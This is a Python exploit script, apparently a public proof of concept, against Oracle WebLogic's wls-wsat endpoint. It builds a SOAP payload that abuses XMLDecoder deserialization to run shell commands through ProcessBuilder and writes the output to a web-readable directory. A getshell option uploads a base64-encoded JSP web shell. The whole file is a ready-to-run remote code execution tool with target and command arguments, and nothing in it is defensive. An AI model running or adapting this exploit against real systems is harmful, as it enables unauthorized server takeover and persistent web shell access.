#!/usr/bin/env python
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import requests
import argparse
import time
import base64
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
timeout = 5
'''
payload的格式化
'''
def payload_command(command_in,output_file,os):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    #命令执行回显：将命令执行的结果输出到文件中
    #command_in_payload = 'find . -name index.html| while read path_file;do {} >$(dirname $path_file)/{};done'.format(command_in,output_file)
    command_in_payload = '{} > ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}'.format(command_in,output_file)
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in_payload)+"</string>"
    #XMLDecoder反序列化payload:
    cmd_app = '/bin/sh' if os == 'linux' else 'cmd.exe'
    cmd_param = '-c' if os == 'linux' else '/c'

    payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                "   <soapenv:Header> " \
                "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                "                  <array class=\"java.lang.String\" length=\"3\">" \
                "                      <void index = \"0\">                       " \
                "                          <string>{}</string>                 " \
                "                      </void>                                    " \
                "                      <void index = \"1\">                       " \
                "                          <string>{}</string>                  " \
                "                      </void>                                    " \
                "                      <void index = \"2\">                       ".format(cmd_app,cmd_param) \
                + command_filtered + \
                "                      </void>                                    " \
                "                  </array>" \
                "                  <void method=\"start\"/>" \
                "                  </void>" \
                "            </java>" \
                "        </work:WorkContext>" \
                "   </soapenv:Header>" \
                "   <soapenv:Body/>" \
                "</soapenv:Envelope>"
    return payload_1

'''
得到命令执行的回显结果
'''
def get_output(target,output_file):
    if not target.startswith('http'):
        target = 'http://{}'.format(target)
    #url增加时间戳避免数据是上一次的结果缓存
    output_url = '{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
    try:
        r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout,verify=False)
        if r.status_code == requests.codes.ok:
            return (True,(r.text.strip()))
        elif r.status_code == 404:
            return (False,'404 no output')
        else:
            return (False,r.status_code)
    except Exception,ex:
        #raise
        return (False,str(ex))

'''
RCE
'''
def weblogic_rce(target,cmd,output_file,os='linux'):
    if not target.startswith('http'):
        target = 'http://{}'.format(target)
    url = '{}/wls-wsat/CoordinatorPortType'.format(target)
    #content-type必须为text/xml
    payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    msg = ''
    try:
        r = requests.post(url, payload_command(cmd,output_file,os),headers = payload_header,verify=False,timeout=timeout,proxies=proxies)
        #500时说明已成功反序列化执行命令
        if r.status_code == 500:
            #delay一下，保证命令执行完整性：
            time.sleep(1)
            return get_output(target,output_file)
        elif r.status_code == 404:
            return (False,'404 no vulnerability')
        else:
            return (False,'{} something went wrong'.format(r.status_code))
    except requests.exceptions.ReadTimeout:
        return (False,'timeout')
    except Exception,ex:
        #raise
        return (False,str(ex))

'''
getshell
'''
def weblogic_getshell(target,output_file,shell_file,os='linux'):
    if not target.startswith('http'):
        target = 'http://{}'.format(target)
    with open(shell_file) as f:
        cmd = 'echo {}|base64 -d'.format(base64.b64encode(f.read()))
        status,result = weblogic_rce(target,cmd,output_file,os)
        if status:
            print '[+]shell-> {}/bea_wls_internal/{}'.format(target,output_file)
        return (status,result)
'''
main
'''
def main():
    global proxies

    parse = argparse.ArgumentParser()
    parse.add_argument('-t', '--target',required=True, help='weblogic ip and port(eg -> 172.16.80.131:7001 or https://172.16.80.131)')
    parse.add_argument('-c', '--cmd', required=False,default='id', help='command to execute,default is "id"')
    parse.add_argument('-o', '--output', required=False,default='output.txt', help='output file name,default is output.txt')
    parse.add_argument('-s', '--shell', required = False,default='',help='local jsp file name to upload,and set -o xxx.jsp')
    parse.add_argument('--os',choices=['linux','win'],default='linux',help='host os:linux or win,default is linux')    
    parse.add_argument('--proxy', action = 'store_true',default=False,help='use proxy')
    args = parse.parse_args()
    
    #是否使用proxy
    if not args.proxy:
        proxies = None
    if args.shell!='':
        status,result = weblogic_getshell(args.target,args.output,args.shell,args.os)
    else:
        status,result = weblogic_rce(args.target,args.cmd,args.output,args.os)
    #output result:
    if status:
        print result
    else:
        print '[-]FAIL:{}'.format(result)

if __name__ == '__main__':
    main()
